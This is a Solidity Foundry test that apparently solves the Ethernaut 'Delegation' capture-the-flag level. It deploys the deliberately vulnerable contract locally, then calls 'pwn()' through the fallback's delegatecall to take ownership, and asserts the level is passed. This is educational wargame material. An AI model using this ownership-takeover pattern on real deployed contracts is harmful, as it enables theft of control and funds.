// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/Delegation.sol";
import "../src/DelegationFactory.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    DelegationFactory level;
    Delegation instance;
    address player = address(123);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new DelegationFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Delegation(payable(instanceAddress));
    }

    function testDelegation() public {
        (bool success,)=address(instance).call(abi.encodeWithSignature("pwn()"));
        //instance.delegate.pwn();
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
